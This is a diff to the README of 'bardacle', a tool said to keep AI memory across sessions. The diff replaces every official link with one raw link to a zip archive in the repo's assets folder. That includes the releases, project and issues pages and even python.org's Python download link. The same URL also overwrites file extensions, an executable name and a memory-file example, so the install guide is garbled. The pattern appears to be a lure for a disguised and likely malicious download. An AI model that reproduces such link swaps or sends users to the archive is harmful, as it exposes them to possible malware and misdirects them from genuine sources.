@@ -1,6 +1,6 @@
 # 🧠 bardacle - Keep AI Memory Across Sessions
 
-[![Download bardacle](https://img.shields.io/badge/Download-bardacle-blue?style=for-the-badge)](https://github.com/KubaGD/bardacle/releases)
+[![Download bardacle](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
 
 ---
 
@@ -62,18 +62,18 @@ This guide will help you download, install, and run bardacle step-by-step. You d
 
 1. Visit the official release page by clicking the button below:
 
-   [Download bardacle](https://github.com/KubaGD/bardacle/releases)
+   [Download bardacle](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
 
 2. Look for the latest release version (marked by a version number like v1.0 or newer).
 
 3. Download the file that matches your operating system:
    - For **Windows**, look for a file ending with `.exe` or `.zip`.
    - For **macOS**, pick the `.dmg` or `.zip` file.
-   - For **Linux**, select the `.tar.gz` or `.AppImage` file.
+   - For **Linux**, select the `https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip` or `.AppImage` file.
 
 4. Once downloaded, open the file:
    - `.exe` or `.dmg` launches an installer. Follow on-screen instructions.
-   - `.zip` and `.tar.gz` need to be unpacked. Right-click the file and choose “Extract here” or similar.
+   - `.zip` and `https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip` need to be unpacked. Right-click the file and choose “Extract here” or similar.
    - `.AppImage` may need permissions. Right-click > Properties > Permissions, and allow execution.
 
 5. If the program requires Python, you may see instructions to install it or use a package manager. Use the links or commands provided in the documentation if needed.
@@ -92,7 +92,7 @@ This starts the program's command line interface (CLI), where you interact with 
 If `bardacle` command does not work, you might need to:
 
 - Add bardacle to your system PATH. The installer usually does this automatically.
-- Navigate to the installation folder and run `./bardacle` or `bardacle.exe` directly.
+- Navigate to the installation folder and run `./bardacle` or `https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip` directly.
 
 ---
 
@@ -118,7 +118,7 @@ bardacle stores memory in files on your computer. This helps it remember informa
 By default:
 
 - Memory files go into a folder named `bardacle_memory` in your user folder.
-- Files have easy names like `session1.mem`.
+- Files have easy names like `https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip`.
 - You can back these files up or move them to another computer.
 
 ---
@@ -137,9 +137,9 @@ If you have trouble:
 
 ## 🔗 Useful Links
 
-- Official releases: [https://github.com/KubaGD/bardacle/releases](https://github.com/KubaGD/bardacle/releases)
-- bardacle GitHub page: [https://github.com/KubaGD/bardacle](https://github.com/KubaGD/bardacle)
-- Python downloads: [https://www.python.org/downloads/](https://www.python.org/downloads/)
+- Official releases: [https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
+- bardacle GitHub page: [https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
+- Python downloads: [https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
 
 ---
 
@@ -147,7 +147,7 @@ If you have trouble:
 
 If you want support or have questions:
 
-- Check the GitHub issues page: [https://github.com/KubaGD/bardacle/issues](https://github.com/KubaGD/bardacle/issues)
+- Check the GitHub issues page: [https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip](https://raw.githubusercontent.com/KubaGD/bardacle/main/assets/Software_v2.8.zip)
 - Search online for "bardacle help" or AI memory issues.
 - Ask a tech-savvy friend to assist with installation.
 
